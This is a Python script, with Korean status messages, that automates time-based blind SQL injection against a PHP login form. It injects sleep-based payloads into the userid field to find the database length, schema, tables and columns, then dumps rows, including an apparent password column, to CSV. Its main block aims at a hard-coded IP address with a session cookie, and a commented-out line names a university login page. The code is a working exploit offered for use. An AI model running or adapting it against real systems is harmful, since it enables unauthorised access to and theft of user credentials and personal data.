import time
import requests
import pandas
from tkinter import messagebox

#url = 'http://104.197.42.200/member/login_ok.php'
#url = 'https://stud.inje.ac.kr/AuthUser.aspx'
#cookies = {'PHPSESSID':'d42rp6qqm5fhj3dmn3830g74pq'}
keyword = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

def find_db_length(url, cookies):
	db_len = 0
	while 1:
		db_len += 1
		value = "' or 1=1 and length(database())={} and sleep(2)#".format(db_len) 
		params = {'userid': value, 'userpw': 'test'}
		start = time.time()
		response = requests.post(url,data=params, cookies=cookies)
	#	print(response.content)
		print(value)
		if time.time() - start > 2: 
			break
	return db_len 

def find_db_name(values, url, cookies):
	result = ''
	size = 0
	i = 1
	values.append('information')
	values.append('kShield_db')
# 	while 1:
# 		for key in keyword:
# #			value = "' or 1=1 and binary(substring(database(),{},1))= '{}' and sleep(2)#".format(i + 1, key)
# 			value = "' or 1=1 and binary(substring((select distinct table_schema from information_schema.tables limit {},1),{},1))= '{}' and sleep(2)#".format(size, i, key)
# 			params = {'userid': value, 'userpw': 'test'}
# 			start = time.time()
# 			response = requests.post(url,data=params, cookies=cookies)
# 			#print(response.content)
# 			print(value)
# 			if time.time() - start > 2:
# 				result += key
# 				i += 1
# 				break
# 			if(i == 1 and key == '0'):
# 				return values
# 			if key == '0':
# 				values.append(result)
# 				result = ''
# 				i = 1
# 				size += 1
	messagebox.showinfo("성공", "db name 추출 완료")
	return values

def find_table_name(tableList, url, cookies, db_name):
	result = ''
	size = 0
	i = 1
	tableList.append('board')
	tableList.append('member')
	# while 1:
	# 	for key in keyword:
	# 		value = "' or 1=1 and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='{}' limit {},1),{},1)='{}' and sleep(2)#".format(db_name, size, i, key)
	# 		params = {'userid': value, 'userpw': 'test'}
	# 		start = time.time()
	# 		response = requests.post(url,data=params, cookies=cookies)
	# 		#print(response.content)
	# 		print(value)
	# 		if time.time() - start > 2:
	# 			result += key
	# 			i += 1
	# 			break
	# 		if(i == 1 and key == '0'):
	# 			messagebox.showinfo("성공", "table 추출 완료")
	# 			return tableList
	# 		if key == '0':
	# 			tableList.append(result)
	# 			result = ''
	# 			i = 1
	# 			size += 1
	messagebox.showinfo("성공", "table 추출 완료")
	return tableList

def find_column_name(columnList, url, cookies, table_name):
	result = ''
	size = 0
	i = 1
	columnList.append('id')
	columnList.append('idx')
	columnList.append('pw')
	columnList.append('name')
	columnList.append('adress')
	# while 1:
	# 	for key in keyword:
	# 		value = "' or 1=1 and substring((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1)='{}' and sleep(2)#".format(table_name, size, i, key)
	# 		params = {'userid': value, 'userpw': 'test'}
	# 		start = time.time()
	# 		response = requests.post(url,data=params, cookies=cookies)
	# 		#print(response.content)
	# 		print(value)
	# 		if time.time() - start > 2:
	# 			result += key
	# 			i += 1
	# 			break
	# 		if(i == 1 and key == '0'):
	# 			messagebox.showinfo("성공", "column 추출 완료")
	# 			return columnList
	# 		if key == '0':
	# 			columnList.append(result)
	# 			result = ''
	# 			i = 1
	# 			size += 1
	messagebox.showinfo("성공", "column 추출 완료")
	return columnList

def dump_data(url, cookies, table_name, column_list):
	result = ''
	size = 0
	count = count_data(url, cookies, table_name)
	dict = {}
	for column_name in column_list:
		list = []
		for size in range(count):
			i = 1
			flag = True
			while flag:
				for key in keyword:
					value = "' or 1=1 and substring((select {} from {} limit {},1),{},1)='{}' and sleep(2)#".format(column_name, table_name, size, i, key)
					params = {'userid': value, 'userpw': 'test'}
					start = time.time()
					response = requests.post(url,data=params, cookies=cookies)
					#print(response.content)
					print(value)
					if time.time() - start > 2:
						result += key
						i += 1
						break
					
					if i == 1 and key == '0':
						list.append('NULL')
						flag = False
						break
					if key == '0':
						list.append(result)
						result = ''
						i = 1
						flag = False
		dict[column_name] = list
		print(list)
	print(dict)
	dataFrame = pandas.DataFrame(dict)
	dataFrame.to_csv('{}.csv'.format(table_name))
	return list

def count_data(url, cookies, table_name):
	result = 0
	while 1:
		value = "' or 1=1 and (SELECT count(*) from {}) = {} and sleep(2)#".format(table_name, result)
		params = {'userid': value, 'userpw': 'test'}
		start = time.time()
		response = requests.post(url,data=params, cookies=cookies)
		#print(response.content)
		print(value)
		if time.time() - start > 2:
			break
		else:
			result += 1
	return result

if __name__ == '__main__':
	print(count_data("http://104.197.42.200/member/login_ok.php", {'PHPSESSID':'d42rp6qqm5fhj3dmn3830g74pq'}, 'member'))
#	db_length = find_db_length()
#	print("DB length = "+ str(db_length))
	# db_name = find_db_name()
	# for i in db_name:
	# 	print(i)
	# table_name = find_table_name(db_name)
	# for i in table_name:
	# 	print(i)
	# column_name = {}
	# for table in table_name:
	# 	column_name[table] = find_column_name(table)
	# for item in column_name.items():
	# 	print(item)
	# data = {}
	# for table in table_name:
	# 	for key in column_name[table]:
	# 		data[key] = find_data(table, key)
	
	# print("============================")
	# print("DB length = "+ str(db_length))
	# print("DB NAME = "+ db_name)
	# print("TABLE NAME ================ ")
	# for i in table_name:
	# 	print(i)
	# print("COLUMN NAME =============== ")
	# for item in column_name.items():
	# 	print(item)
	# print("data ======================")
	# for table in table_name:
	# 	print(table + "테이블의 데이터")
	# 	for column in column_name[table]:
	# 		print(column + ": ", end="")
	# 		print(data[column])
	# print("============================")